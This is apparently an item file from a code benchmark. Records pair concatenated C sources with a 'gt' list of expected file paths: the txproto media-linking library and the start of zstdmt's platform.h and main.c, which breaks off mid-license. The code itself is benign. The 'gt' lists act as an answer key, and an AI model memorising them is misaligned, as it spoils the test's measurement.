        "content": "'txproto/src/include/libtxproto/log.h'\n:\n\n#pragma once\n\n#include <stdint.h>\n#include <libavutil/log.h>\n\nenum SPType {\n    SP_TYPE_NONE = 0,\n    SP_TYPE_INTERFACE = (1 << 0),\n    SP_TYPE_CONTEXT = (1 << 1),\n    SP_TYPE_EXTERNAL = (1 << 2),\n    SP_TYPE_SCRIPT = (1 << 3),\n\n    SP_TYPE_VIDEO_SOURCE = (1 << 4),\n    SP_TYPE_VIDEO_SINK = (1 << 5),\n    SP_TYPE_VIDEO_BIDIR = SP_TYPE_VIDEO_SOURCE | SP_TYPE_VIDEO_SINK,\n\n    SP_TYPE_AUDIO_SOURCE = (1 << 8),\n    SP_TYPE_AUDIO_SINK = (1 << 9),\n    SP_TYPE_AUDIO_BIDIR = SP_TYPE_AUDIO_SOURCE | SP_TYPE_AUDIO_SINK,\n\n    SP_TYPE_SUB_SOURCE = (1 << 12),\n    SP_TYPE_SUB_SINK = (1 << 13),\n    SP_TYPE_SUB_BIDIR = SP_TYPE_SUB_SOURCE | SP_TYPE_SUB_SINK,\n\n    SP_TYPE_SOURCE = SP_TYPE_VIDEO_SOURCE | SP_TYPE_AUDIO_SOURCE | SP_TYPE_SUB_SOURCE,\n    SP_TYPE_SINK = SP_TYPE_VIDEO_SINK | SP_TYPE_AUDIO_SINK | SP_TYPE_SUB_SINK,\n    SP_TYPE_INOUT = SP_TYPE_SOURCE | SP_TYPE_SINK,\n\n    SP_TYPE_CLOCK_SOURCE = (1 << 14),\n    SP_TYPE_CLOCK_SINK = (1 << 15),\n\n    SP_TYPE_FILTER = (1 << 16),\n\n    SP_TYPE_ENCODER = (1 << 20),\n    SP_TYPE_DECODER = (1 << 21),\n    SP_TYPE_CODEC = SP_TYPE_ENCODER | SP_TYPE_DECODER,\n\n    SP_TYPE_BSF = (1 << 24),\n\n    SP_TYPE_MUXER = (1 << 28),\n    SP_TYPE_DEMUXER = (1 << 29),\n    SP_TYPE_MUXING = SP_TYPE_MUXER | SP_TYPE_DEMUXER,\n};\n\nenum SPLogLevel {\n    SP_LOG_QUIET    = -(1 << 0),\n    SP_LOG_FATAL    =  (0 << 0),\n    SP_LOG_ERROR    = +(1 << 0),\n    SP_LOG_WARN     = +(1 << 1),\n    SP_LOG_INFO     = +(1 << 2),\n    SP_LOG_VERBOSE  = +(1 << 3),\n    SP_LOG_DEBUG    = +(1 << 4),\n    SP_LOG_TRACE    = +(1 << 5),\n\n\n    SP_NOLOG        = +(1 << 7),\n\n    SP_LOG_LIST     = +(1 << 8),\n    SP_LOG_LIST_END = +(1 << 9),\n};\n\ntypedef struct SPClass SPClass;\n\n#if defined(__GNUC__) || defined(__clang__)\n#define sp_printf_format(fmtpos, attrpos) __attribute__((__format__(__printf__, fmtpos, attrpos)))\n#else\n#define sp_printf_format(fmtpos, attrpos)\n#endif\n\n\nint sp_log_init(enum SPLogLevel global_log_level);\nvoid sp_log_uninit(void);\n\nenum SPStatusFlags {\n    SP_STATUS_UNLOCK   = 1 << 0,\n    SP_STATUS_LOCK     = 1 << 1,\n    SP_STATUS_NO_CLEAR = 1 << 2,\n};\n\n\nint sp_log_set_status(const char *status, enum SPStatusFlags flags);\n\n\nvoid sp_log_set_prompt_callback(void *ctx, void (*cb)(void *ctx, int newline_started));\n\n\nenum SPLogLevel sp_log_get_ctx_lvl(const char *component);\nint sp_log_set_ctx_lvl(const char *component, enum SPLogLevel lvl);\nint sp_log_set_ctx_lvl_str(const char *component, const char *lvl);\n\n\nvoid sp_log_set_json_out(int file, int std);\n\n\nvoid sp_log(void *ctx, enum SPLogLevel level, const char *fmt, ...) sp_printf_format(3, 4);\n\n\nint sp_log_set_file(const char *path);\n\n\nvoid sp_log_print_ts(int enable);\n\n\nint sp_class_alloc(void *ctx, const char *name, enum SPType type, void *parent);\nvoid sp_class_free(void *ctx);\n\n\nuint32_t sp_class_get_id(void *ctx);\nconst char *sp_class_get_name(void *ctx);\nconst char *sp_class_get_parent_name(void *ctx);\nint sp_class_set_name(void *ctx, const char *name);\nenum SPType sp_class_get_type(void *ctx);\nconst char *sp_class_type_string(void *ctx);\nenum SPType sp_avcategory_to_type(AVClassCategory category);\n\n'txproto/src/link.c'\n:\n\n#include <libtxproto/commit.h>\n#include <libtxproto/control.h>\n#include <libtxproto/decode.h>\n#include <libtxproto/demux.h>\n#include <libtxproto/encode.h>\n#include <libtxproto/filter.h>\n#include <libtxproto/link.h>\n#include <libtxproto/mux.h>\n\n#include \"iosys_common.h\"\n#ifdef HAVE_INTERFACE\n#include \"interface_common.h\"\n#endif\n\ntypedef struct EncoderModeNegotiate {\n    int need_global;\n} EncoderModeNegotiate;\n\nstatic int encoder_mode_event_cb(AVBufferRef *event_ref, void *callback_ctx,\n                                 void *ctx, void *dep_ctx, void *data)\n{\n    EncoderModeNegotiate *mode_ctx = callback_ctx;\n    EncodingContext *enc = ctx;\n\n    if (mode_ctx->need_global)\n        enc->need_global_header = 1;\n\n    return 0;\n}\n\nstatic int encoder_mode_negotiate(AVBufferRef *enc_ref, int want_global)\n{\n    EncodingContext *enc = (EncodingContext *)enc_ref->data;\n\n    if (sp_eventlist_has_dispatched(enc->events, SP_EVENT_ON_CONFIG))\n        return AVERROR(EINVAL);\n\n    if (!enc->mode_negotiate_event) {\n        AVBufferRef *event = sp_event_create(encoder_mode_event_cb, NULL,\n                                             sizeof(EncoderModeNegotiate),\n                                             NULL, SP_EVENT_FLAG_ONESHOT |\n                                                   SP_EVENT_ON_CONFIG,\n                                             enc, NULL);\n        if (!event)\n            return AVERROR(ENOMEM);\n\n        int ret = sp_encoder_ctrl(enc_ref, SP_EVENT_CTRL_NEW_EVENT, event);\n        if (ret < 0) {\n            av_buffer_unref(&event);\n            return ret;\n        }\n\n        enc->mode_negotiate_event = event;\n    }\n\n    EncoderModeNegotiate *neg_ctx = av_buffer_get_opaque(enc->mode_negotiate_event);\n    neg_ctx->need_global |= !!want_global;\n\n    return 0;\n}\n\nstatic SPBufferList *sp_ctx_get_events_list(void *ctx)\n{\n    enum SPType type = sp_class_get_type(ctx);\n    switch (type) {\n    case SP_TYPE_AUDIO_SOURCE:\n    case SP_TYPE_AUDIO_SINK:\n    case SP_TYPE_AUDIO_BIDIR:\n    case SP_TYPE_VIDEO_SOURCE:\n    case SP_TYPE_VIDEO_SINK:\n    case SP_TYPE_VIDEO_BIDIR:\n        return ((IOSysEntry *)ctx)->events;\n    case SP_TYPE_MUXER:\n        return ((MuxingContext *)ctx)->events;\n    case SP_TYPE_FILTER:\n        return ((FilterContext *)ctx)->events;\n    case SP_TYPE_ENCODER:\n        return ((EncodingContext *)ctx)->events;\n    case SP_TYPE_DECODER:\n        return ((DecodingContext *)ctx)->events;\n    case SP_TYPE_DEMUXER:\n        return ((DemuxingContext *)ctx)->events;\n    default:\n        break;\n    }\n    return NULL;\n}\n\nstatic AVBufferRef *sp_ctx_get_fifo(void *ctx, int out)\n{\n    enum SPType type = sp_class_get_type(ctx);\n    switch (type) {\n    case SP_TYPE_AUDIO_SOURCE:\n    case SP_TYPE_AUDIO_SINK:\n    case SP_TYPE_VIDEO_SOURCE:\n    case SP_TYPE_VIDEO_SINK:\n    case SP_TYPE_SUB_SOURCE:\n    case SP_TYPE_SUB_SINK:\n    case SP_TYPE_VIDEO_BIDIR:\n    case SP_TYPE_AUDIO_BIDIR:\n    case SP_TYPE_SUB_BIDIR:\n    case SP_TYPE_SOURCE:\n    case SP_TYPE_SINK:\n    case SP_TYPE_INOUT:\n        return ((IOSysEntry *)ctx)->frames;\n    case SP_TYPE_MUXER:\n        sp_assert(!out);\n        return ((MuxingContext *)ctx)->src_packets;\n    case SP_TYPE_FILTER:\n        return NULL;\n    case SP_TYPE_ENCODER:\n        if (out)\n            return ((EncodingContext *)ctx)->dst_packets;\n        else\n            return ((EncodingContext *)ctx)->src_frames;\n#ifdef HAVE_INTERFACE\n    case SP_TYPE_INTERFACE:\n        return sp_interface_get_fifo(ctx);\n#endif\n    case SP_TYPE_DECODER:\n        if (out)\n            return ((DecodingContext *)ctx)->dst_frames;\n        else\n            return ((DecodingContext *)ctx)->src_packets;\n    case SP_TYPE_DEMUXER:\n        return NULL;\n    default:\n        sp_assert(0);\n        return NULL;\n    }\n    sp_assert(0);\n    return NULL;\n}\n\ntypedef struct SPLinkCtx {\n    char *src_filt_pad;\n    char *dst_filt_pad;\n    AVBufferRef *src_ref;\n    AVBufferRef *dst_ref;\n\n    int src_stream_id;\n    char *src_stream_desc;\n} SPLinkCtx;\n\nstatic int link_fn(AVBufferRef *event_ref, void *callback_ctx, void *dst_ctx,\n                   void *src_ctx, void *data)\n{\n    SPLinkCtx *cb_ctx = callback_ctx;\n\n    enum SPType s_type = sp_class_get_type(src_ctx);\n    enum SPType d_type = sp_class_get_type(dst_ctx);\n\n    AVBufferRef *src_fifo = sp_ctx_get_fifo(src_ctx, 1);\n    AVBufferRef *dst_fifo = sp_ctx_get_fifo(dst_ctx, 0);\n\n    sp_log(dst_ctx, SP_LOG_VERBOSE, \"Linking %s \\\"%s\\\"%s%s%s to \"\n                                            \"%s \\\"%s\\\"%s%s%s\\n\",\n           sp_class_type_string(src_ctx), sp_class_get_name(src_ctx),\n           s_type != SP_TYPE_FILTER ? \"\" : \" (pad: \",\n           s_type != SP_TYPE_FILTER ? \"\" : (cb_ctx->src_filt_pad ? cb_ctx->src_filt_pad : \"default\"),\n           s_type != SP_TYPE_FILTER ? \"\" : \")\",\n\n           sp_class_type_string(dst_ctx), sp_class_get_name(dst_ctx),\n           d_type != SP_TYPE_FILTER ? \"\" : \" (pad: \",\n           d_type != SP_TYPE_FILTER ? \"\" : (cb_ctx->dst_filt_pad ? cb_ctx->dst_filt_pad : \"default\"),\n           d_type != SP_TYPE_FILTER ? \"\" : \")\");\n\n    if ((s_type == SP_TYPE_FILTER) && (d_type == SP_TYPE_FILTER)) {\n        return sp_map_pad_to_pad((FilterContext *)dst_ctx, cb_ctx->dst_filt_pad,\n                                 (FilterContext *)src_ctx, cb_ctx->src_filt_pad);\n    } else if (s_type == SP_TYPE_FILTER && (d_type == SP_TYPE_ENCODER)) {\n        return sp_map_fifo_to_pad((FilterContext *)src_ctx, dst_fifo,\n                                  cb_ctx->src_filt_pad, 1);\n    } else if ((s_type & SP_TYPE_INOUT) && (d_type == SP_TYPE_FILTER)) {\n        return sp_map_fifo_to_pad((FilterContext *)dst_ctx, src_fifo,\n                                  cb_ctx->dst_filt_pad, 0);\n    } else if ((s_type == SP_TYPE_ENCODER) && (d_type == SP_TYPE_MUXER)) {\n        EncodingContext *src_enc_ctx  = src_ctx;\n        MuxingContext   *dst_mux_ctx  = dst_ctx;\n\n        sp_assert(dst_fifo && src_fifo);\n\n        int err = sp_muxer_add_stream(dst_mux_ctx, src_enc_ctx);\n        if (err < 0)\n            return err;\n\n        return sp_packet_fifo_mirror(dst_fifo, src_fifo);\n    } else if ((s_type == SP_TYPE_DEMUXER) && (d_type == SP_TYPE_DECODER)) {\n        DemuxingContext *src_mux_ctx = src_ctx;\n        DecodingContext *dst_dec_ctx = dst_ctx;\n\n        return sp_decoding_connect(dst_dec_ctx, src_mux_ctx,\n                                   cb_ctx->src_stream_id, cb_ctx->src_stream_desc);\n    } else if ((s_type & SP_TYPE_DECODER) && (d_type == SP_TYPE_ENCODER)) {\n        sp_assert(dst_fifo && src_fifo);\n\n        return sp_frame_fifo_mirror(dst_fifo, src_fifo);\n    } else if ((s_type & SP_TYPE_DECODER) && (d_type == SP_TYPE_INTERFACE)) {\n        sp_assert(dst_fifo && src_fifo);\n\n        return sp_frame_fifo_mirror(dst_fifo, src_fifo);\n    } else if (s_type == SP_TYPE_DECODER && (d_type == SP_TYPE_FILTER)) {\n        sp_assert(!!src_fifo);\n\n        return sp_map_fifo_to_pad((FilterContext *)dst_ctx, src_fifo,\n                                  cb_ctx->dst_filt_pad, 0);\n    } else if ((s_type & SP_TYPE_INOUT) && (d_type == SP_TYPE_ENCODER)) {\n        if (!dst_fifo) {\n            sp_log(dst_ctx, SP_LOG_VERBOSE, \"Unable to get FIFO from interface, unsupported!\\n\");\n            return AVERROR(EINVAL);\n        }\n\n        return sp_frame_fifo_mirror(dst_fifo, src_fifo);\n    } else if ((s_type == SP_TYPE_FILTER) && (d_type == SP_TYPE_INTERFACE)) {\n        if (!dst_fifo) {\n            sp_log(dst_ctx, SP_LOG_VERBOSE, \"Unable to get FIFO from interface, unsupported!\\n\");\n            return AVERROR(EINVAL);\n        }\n\n        return sp_map_fifo_to_pad((FilterContext *)src_ctx, dst_fifo,\n                                  cb_ctx->src_filt_pad, 1);\n    } else if ((s_type & SP_TYPE_INOUT) && (d_type == SP_TYPE_INTERFACE)) {\n        if (!dst_fifo) {\n            sp_log(dst_ctx, SP_LOG_VERBOSE, \"Unable to get FIFO from interface, unsupported!\\n\");\n            return AVERROR(EINVAL);\n        }\n\n        return sp_frame_fifo_mirror(dst_fifo, src_fifo);\n    } else {\n        sp_assert(1);\n    }\n\n    sp_assert(0);\n\n    return 0;\n}\n\nstatic void link_free(void *callback_ctx, void *dst_ctx, void *src_ctx)\n{\n    SPLinkCtx *cb_ctx = callback_ctx;\n    av_free(cb_ctx->src_filt_pad);\n    av_free(cb_ctx->dst_filt_pad);\n    av_free(cb_ctx->src_stream_desc);\n    av_buffer_unref(&cb_ctx->src_ref);\n    av_buffer_unref(&cb_ctx->dst_ref);\n}\n\nint sp_generic_link(TXMainContext *ctx,\n                    AVBufferRef *obj1,\n                    AVBufferRef *obj2,\n                    int autostart,\n                    const char *src_pad_name,\n                    const char *dst_pad_name,\n                    int src_stream_id,\n                    const char *src_stream_desc)\n{\n    int err;\n    AVBufferRef *src_ref;\n    AVBufferRef *dst_ref;\n    char *src_filt_pad = NULL;\n    char *dst_filt_pad = NULL;\n    int stream_id = -1;\n    char *stream_desc = NULL;\n    ctrl_fn src_ctrl_fn = NULL;\n    ctrl_fn dst_ctrl_fn = NULL;\n\n#define EITHER(o1, o2, t1, t2)                                                                             \\\n    ((((sp_class_get_type(o1->data) & (t1)) == (t1)) && ((sp_class_get_type(o2->data) & (t2)) == (t2))) || \\\n     (((sp_class_get_type(o1->data) & (t2)) == (t2)) && ((sp_class_get_type(o2->data) & (t1)) == (t1))))\n\n#define PICK_REF(o1, o2, type)                                   \\\n    av_buffer_ref(sp_class_get_type(o1->data) == type ? o1 : o2)\n\n#define PICK_REF_INV(o1, o2, type)                               \\\n    av_buffer_ref(sp_class_get_type(o1->data) != type ? o1 : o2)\n\n    if (EITHER(obj1, obj2, SP_TYPE_ENCODER, SP_TYPE_MUXER)) {\n        src_ref = PICK_REF(obj1, obj2, SP_TYPE_ENCODER);\n        dst_ref = PICK_REF(obj1, obj2, SP_TYPE_MUXER);\n        src_ctrl_fn = sp_encoder_ctrl;\n        dst_ctrl_fn = sp_muxer_ctrl;\n\n        MuxingContext *dst_mux_ctx = (MuxingContext *)dst_ref->data;\n        int mux_needs_global = dst_mux_ctx->avf->oformat->flags & AVFMT_GLOBALHEADER;\n\n        err = encoder_mode_negotiate(src_ref, mux_needs_global);\n        if (err != AVERROR(EINVAL) && err < 0)\n            return err;\n    } else if (EITHER(obj1, obj2, SP_TYPE_ENCODER, SP_TYPE_VIDEO_SOURCE) ||\n               EITHER(obj1, obj2, SP_TYPE_ENCODER, SP_TYPE_AUDIO_SOURCE)) {\n        src_ref = PICK_REF_INV(obj1, obj2, SP_TYPE_ENCODER);\n        dst_ref = PICK_REF(obj1, obj2, SP_TYPE_ENCODER);\n        src_ctrl_fn = ((IOSysEntry *)src_ref->data)->ctrl;\n        dst_ctrl_fn = sp_encoder_ctrl;\n    } else if (EITHER(obj1, obj2, SP_TYPE_ENCODER, SP_TYPE_FILTER)) {\n        src_ref = PICK_REF(obj1, obj2, SP_TYPE_FILTER);\n        dst_ref = PICK_REF(obj1, obj2, SP_TYPE_ENCODER);\n        src_filt_pad = av_strdup(src_pad_name);\n        src_ctrl_fn = sp_filter_ctrl;\n        dst_ctrl_fn = sp_encoder_ctrl;\n    } else if (EITHER(obj1, obj2, SP_TYPE_DECODER, SP_TYPE_FILTER)) {\n        src_ref = PICK_REF(obj1, obj2, SP_TYPE_DECODER);\n        dst_ref = PICK_REF(obj1, obj2, SP_TYPE_FILTER);\n        dst_filt_pad = av_strdup(dst_pad_name);\n        src_ctrl_fn = sp_decoder_ctrl;\n        dst_ctrl_fn = sp_filter_ctrl;\n    } else if (EITHER(obj1, obj2, SP_TYPE_FILTER, SP_TYPE_VIDEO_SOURCE) ||\n               EITHER(obj1, obj2, SP_TYPE_FILTER, SP_TYPE_AUDIO_SOURCE)) {\n        src_ref = PICK_REF_INV(obj1, obj2, SP_TYPE_FILTER);\n        dst_ref = PICK_REF(obj1, obj2, SP_TYPE_FILTER);\n        dst_filt_pad = av_strdup(dst_pad_name);\n        src_ctrl_fn = ((IOSysEntry *)src_ref->data)->ctrl;\n        dst_ctrl_fn = sp_filter_ctrl;\n    } else if ((sp_class_get_type(obj1->data) == SP_TYPE_FILTER) &&\n               (sp_class_get_type(obj2->data) == SP_TYPE_FILTER)) {\n\n        src_ref = av_buffer_ref(obj1);\n        dst_ref = av_buffer_ref(obj2);\n        src_filt_pad = av_strdup(src_pad_name);\n        dst_filt_pad = av_strdup(dst_pad_name);\n        src_ctrl_fn = sp_filter_ctrl;\n        dst_ctrl_fn = sp_filter_ctrl;\n#ifdef HAVE_INTERFACE\n    } else if (EITHER(obj1, obj2, SP_TYPE_INTERFACE, SP_TYPE_FILTER)) {\n        src_ref = PICK_REF(obj1, obj2, SP_TYPE_FILTER);\n        dst_ref = PICK_REF(obj1, obj2, SP_TYPE_INTERFACE);\n        src_filt_pad = av_strdup(src_pad_name);\n        src_ctrl_fn = sp_filter_ctrl;\n        dst_ctrl_fn = sp_interface_ctrl;\n    } else if (EITHER(obj1, obj2, SP_TYPE_INTERFACE, SP_TYPE_DECODER)) {\n        src_ref = PICK_REF(obj1, obj2, SP_TYPE_DECODER);\n        dst_ref = PICK_REF(obj1, obj2, SP_TYPE_INTERFACE);\n        src_ctrl_fn = sp_decoder_ctrl;\n        dst_ctrl_fn = sp_interface_ctrl;\n    } else if (EITHER(obj1, obj2, SP_TYPE_INTERFACE, SP_TYPE_VIDEO_SOURCE)) {\n        src_ref = PICK_REF_INV(obj1, obj2, SP_TYPE_INTERFACE);\n        dst_ref = PICK_REF(obj1, obj2, SP_TYPE_INTERFACE);\n        src_ctrl_fn = ((IOSysEntry *)src_ref->data)->ctrl;\n        dst_ctrl_fn = sp_interface_ctrl;\n#endif\n    } else if (EITHER(obj1, obj2, SP_TYPE_ENCODER, SP_TYPE_DECODER)) {\n        src_ref = PICK_REF(obj1, obj2, SP_TYPE_DECODER);\n        dst_ref = PICK_REF(obj1, obj2, SP_TYPE_ENCODER);\n        src_ctrl_fn = sp_decoder_ctrl;\n        dst_ctrl_fn = sp_encoder_ctrl;\n    } else if (EITHER(obj1, obj2, SP_TYPE_DEMUXER, SP_TYPE_DECODER)) {\n        src_ref = PICK_REF(obj1, obj2, SP_TYPE_DEMUXER);\n        dst_ref = PICK_REF(obj1, obj2, SP_TYPE_DECODER);\n        stream_id = src_stream_id;\n        stream_desc = av_strdup(src_stream_desc);\n        src_ctrl_fn = sp_demuxer_ctrl;\n        dst_ctrl_fn = sp_decoder_ctrl;\n    } else {\n        sp_log(ctx, SP_LOG_ERROR, \"Unable to link \\\"%s\\\" (%s) to \\\"%s\\\" (%s)!\\n\",\n               sp_class_get_name(obj1->data), sp_class_type_string(obj1->data),\n               sp_class_get_name(obj2->data), sp_class_type_string(obj2->data));\n        return AVERROR(EINVAL);\n    }\n\n    sp_log(ctx, SP_LOG_VERBOSE, \"Linking \\\"%s\\\" (%s) to \\\"%s\\\" (%s)\\n\",\n           sp_class_get_name(obj1->data), sp_class_type_string(obj1->data),\n           sp_class_get_name(obj2->data), sp_class_type_string(obj2->data));\n\n    void *sctx = (void *)src_ref->data;\n    void *dctx = (void *)dst_ref->data;\n\n    SPEventType flags = SP_EVENT_FLAG_ONESHOT        |\n                        SP_EVENT_TYPE_LINK           |\n                        sp_class_to_event_type(sctx) |\n                        sp_class_to_event_type(dctx);\n\n    SPBufferList *src_events = sp_ctx_get_events_list(sctx);\n    if (!src_events) {\n        sp_log(ctx, SP_LOG_ERROR, \"Unable to link \\\"%s\\\" (%s) to \\\"%s\\\" (%s)!\",\n               sp_class_get_name(obj1->data), sp_class_type_string(obj1->data),\n               sp_class_get_name(obj2->data), sp_class_type_string(obj2->data));\n        return AVERROR(EINVAL);\n    }\n\n    SPEventType src_post_init = sp_eventlist_has_dispatched(src_events,\n                                                            SP_EVENT_ON_INIT);\n    src_post_init = 0;\n    if (src_post_init)\n        flags |= SP_EVENT_ON_COMMIT;\n    else\n        flags |= SP_EVENT_ON_CONFIG;\n\n    if (!src_post_init)\n        flags |= SP_EVENT_FLAG_DEPENDENCY;\n\n    AVBufferRef *link_event = sp_event_create(link_fn, link_free,\n                                              sizeof(SPLinkCtx), NULL, flags,\n                                              dctx, sctx);\n\n    SPLinkCtx *link_event_ctx = av_buffer_get_opaque(link_event);\n    link_event_ctx->src_filt_pad = src_filt_pad;\n    link_event_ctx->dst_filt_pad = dst_filt_pad;\n    link_event_ctx->src_ref = src_ref;\n    link_event_ctx->dst_ref = dst_ref;\n    link_event_ctx->src_stream_id = stream_id;\n    link_event_ctx->src_stream_desc = stream_desc;\n\n\n    dst_ctrl_fn(dst_ref, SP_EVENT_CTRL_NEW_EVENT, link_event);\n\n\n    if (!src_post_init) {\n        err = src_ctrl_fn(src_ref, SP_EVENT_CTRL_SIGNAL | SP_EVENT_ON_INIT, link_event);\n        if (err < 0) {\n            av_buffer_unref(&link_event);\n            sp_log(ctx, SP_LOG_ERROR, \"Unable to add linking event: %s!\\n\", av_err2str(err));\n            return AVERROR(EINVAL);\n        }\n    }\n\n\n    av_buffer_unref(&link_event);\n\n    if (autostart) {\n        err = sp_generic_ctrl(ctx, src_ref, SP_EVENT_CTRL_START, NULL);\n        if (err < 0)\n            return err;\n\n        err = sp_generic_ctrl(ctx, dst_ref, SP_EVENT_CTRL_START, NULL);\n        if (err < 0)\n            return err;\n    } else {\n        sp_add_discard_fn_to_list(ctx, sp_get_ctrl_fn(src_ref->data), src_ref);\n        sp_add_discard_fn_to_list(ctx, sp_get_ctrl_fn(dst_ref->data), dst_ref);\n    }\n\n    return 0;\n}\n\n'txproto/src/include/libtxproto/filter.h'\n:\n\n#pragma once\n\n#include <libavfilter/avfilter.h>\n#include <libavfilter/buffersrc.h>\n#include <libavutil/dict.h>\n#include <libavutil/hwcontext.h>\n\n#include <libtxproto/utils.h>\n#include \"log.h\"\n\ntypedef struct FilterPad {\n    struct FilterContext *main;\n    char *name;\n    int is_out;\n    enum AVMediaType type;\n    AVDictionary *metadata;\n\n    AVFilterContext *buffer;\n    AVFilterContext *filter;\n    int filter_pad;\n\n\n    int eos;\n\n\n    int dropped_frames;\n\n    AVBufferRef *fifo;\n    AVFrame *in_fmt;\n} FilterPad;\n\ntypedef struct FilterContext {\n    SPClass *class;\n\n    SPBufferList *events;\n    AVFilterGraph *graph;\n\n    char **in_pad_names;\n    char **out_pad_names;\n\n    int dump_graph;\n    int fifo_size;\n\n\n    enum AVHWDeviceType device_type;\n    AVBufferRef *hw_device_ref;\n\n\n    FilterPad **in_pads;\n    int num_in_pads;\n\n\n    FilterPad **out_pads;\n    int num_out_pads;\n\n\n    const char *graph_str;\n    AVDictionary *direct_filter_opts;\n    enum AVPixelFormat direct_filter_fmt;\n    AVDictionary *graph_opts;\n    int direct_filter;\n\n\n    pthread_t filter_thread;\n    pthread_mutex_t lock;\n\n    int64_t epoch;\n\n\n    int err;\n} FilterContext;\n\n\nAVBufferRef *sp_filter_alloc(void);\n\n\nint sp_init_filter_single(AVBufferRef *ctx_ref, const char *name, const char *filt,\n                          char **in_pad_names, char **out_pad_names, enum AVPixelFormat req_fmt,\n                          AVDictionary *opts, AVDictionary *graph_opts,\n                          enum AVHWDeviceType derive_device);\n\n\nint sp_init_filter_graph(AVBufferRef *ctx_ref, const char *name, const char *graph,\n                         char **in_pad_names, char **out_pad_names,\n                         AVDictionary *graph_opts, enum AVHWDeviceType derive_device);\n\n\nint sp_map_fifo_to_pad(FilterContext *ctx, AVBufferRef *fifo,\n                       const char *name, int is_out);\n\n\nint sp_map_pad_to_pad(FilterContext *dst, const char *dst_pad,\n                      FilterContext *src, const char *src_pad);\n\n\nint sp_filter_ctrl(AVBufferRef *ctx_ref, SPEventType ctrl, void *arg);\n",
        "gt": [
            "'txproto/src/include/libtxproto/log.h'",
            "'txproto/src/include/libtxproto/filter.h'",
            "'txproto/src/link.c'"
        ]
    },
    {
        "files": [
            "'zstdmt/programs/platform.h'",
            "'zstdmt/programs/main.c'",
            "'zstdmt/programs/lzfse-mt.c'"
        ],
        "content": "'zstdmt/programs/platform.h'\n:\n\n\n#ifndef PLATFORM_H\n#define PLATFORM_H\n\n#if defined (__cplusplus)\nextern \"C\" {\n#endif\n\n#include \"../lib/memmt.h\"\n\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <sys/time.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <stddef.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <errno.h>\n#include <time.h>\n#include <utime.h>\n\nextern int getcpucount(void);\n\n#define _FILE_OFFSET_BITS 64\n\n#if defined(_MSC_VER) || defined(__MINGW32__)\n\n\n#include <windows.h>\n#include <processthreadsapi.h>\n#include <timezoneapi.h>\n#include <psapi.h>\n#include <io.h>\n\n#define DEVNULL \"NUL\"\n#define PATH_SEPERATOR '\\\\'\n#define SET_BINARY(file) setmode(fileno(file),O_BINARY)\n#define IS_CONSOLE(stdStream) (_isatty(_fileno(stdStream)))\n\n# ifndef _TIMEVAL_DEFINED\n# define _TIMEVAL_DEFINED\nstruct timeval {\n\tlong tv_sec;\n\tlong tv_usec;\n};\n# endif\nextern int gettimeofday(struct timeval *tp, void *tzp);\n\n#define timersub(a,b,x) do \\\n{ (x)->tv_sec=(a)->tv_sec-(b)->tv_sec; \\\nif (((x)->tv_usec=(a)->tv_usec-(b)->tv_usec)<0) \\\n{ --(x)->tv_sec; (x)->tv_usec+=1000000; } } while (0)\n\n#define RUSAGE_SELF\t0\nstruct rusage {\n\tstruct timeval ru_utime;\n\tstruct timeval ru_stime;\n\tU64 ru_maxrss;\n\tU64 ru_ixrss;\n\tU64 ru_idrss;\n\tU64 ru_isrss;\n\tU64 ru_minflt;\n\tU64 ru_majflt;\n\tU64 ru_nswap;\n\tU64 ru_inblock;\n\tU64 ru_oublock;\n\tU64 ru_msgsnd;\n\tU64 ru_msgrcv;\n\tU64 ru_nsignals;\n\tU64 ru_nvcsw;\n\tU64 ru_nivcsw;\n};\nextern int getrusage(int who, struct rusage *uv_rusage);\n#else\n\n\n\n#include <sys/resource.h>\n#define DEVNULL \"/dev/null\"\n#define PATH_SEPERATOR '/'\n#define SET_BINARY(file)\n#define IS_CONSOLE(stdStream) (isatty(fileno(stdStream)))\n\n#endif\n\n#if defined (__cplusplus)\n}\n#endif\n\n#endif\n\n'zstdmt/programs/main.c'\n:\n\n\n\n\n#include \"platform.h\"\n\n#define MODE_COMPRESS    1\n#define MODE_DECOMPRESS  2\n#define MODE_LIST        3\n#define MODE_TEST        4\nstatic int opt_mode = MODE_COMPRESS;\n\n\n#define MAX_ITERATIONS   1000\nstatic int opt_iterations = 1;\n\n\n#define E_OK      0\n#define E_ERROR   1\n#define E_WARNING 2\nstatic int exit_code = E_OK;\n\nstatic int opt_stdout = 0;\nstatic int opt_level = LEVEL_DEF;\nstatic int opt_force = 0;\nstatic int opt_keep = 0;\nstatic int opt_threads;\n\n\nstatic int opt_verbose = 1;\nstatic int opt_bufsize = 0;\nstatic int opt_timings = 0;\nstatic int opt_nocrc = 0;\n\nstatic char *progname;\nstatic char *opt_filename;\nstatic char *opt_suffix = SUFFIX;\nstatic const char *errmsg = 0;\n\n\nstatic FILE *fin = NULL;\nstatic FILE *fout = NULL;\nstatic size_t bytes_read = 0;\nstatic size_t bytes_written = 0;\n\n\nstatic int global_fout = 0;\n\nstatic MT_CCtx *cctx = 0;\nstatic MT_DCtx *dctx = 0;\n\n\nstatic struct timeval tms, tme, tm;\n\n\nstatic time_t mtime;\nstatic unsigned int crc = 0;\nstatic unsigned int crc32_table[1][256];\nstatic unsigned int crc32(const unsigned char *buf, size_t size,\n\t\t\t  unsigned int crc);\n\nstatic void panic(const char *msg)\n{\n\tif (opt_verbose)\n\t\tfprintf(stderr, \"%s\\n\", msg);\n\texit(1);\n}\n\nstatic void version(int quit)\n{\n\tprintf(\" %s using libzstdmt v0.8, using %s %s\"\n\t\t\"\\n Copyright (c) 2016 - 2024 Tino Reichardt\",\n\t\tprogname, METHOD, VERSION);\n\n\tif (quit)\n\t\texit(0);\n}\n\nstatic void license(void)\n{\n\tversion(0);\n\tprintf(\"\\n\"\n\t       \"\\n Redistribution and use in source and binary forms, with or without modification,\"\n\t       \"\\n are permitted provided that the following conditions are met:\"\n\t       \"\\n \"\n\t       \"\\n  * Redistributions of source code must retain the above copyright notice, this\"\n\t       \"\\n    list of conditions and the following disclaimer.\"\n\t       \"\\n \"\n\t       \"\\n  * Redistributions in binary form must reproduce the above copyright notice,\"\n\t       \"\\n    this list of conditions and the following disclaimer in the documentation\"\n\t       \"\\n    and/or other materials provided with the distribution.\"\n\t       \"\\n \"\n\t       \"\\n THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \\\"AS IS\\\" AND\"\n\t       \"\\n ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED 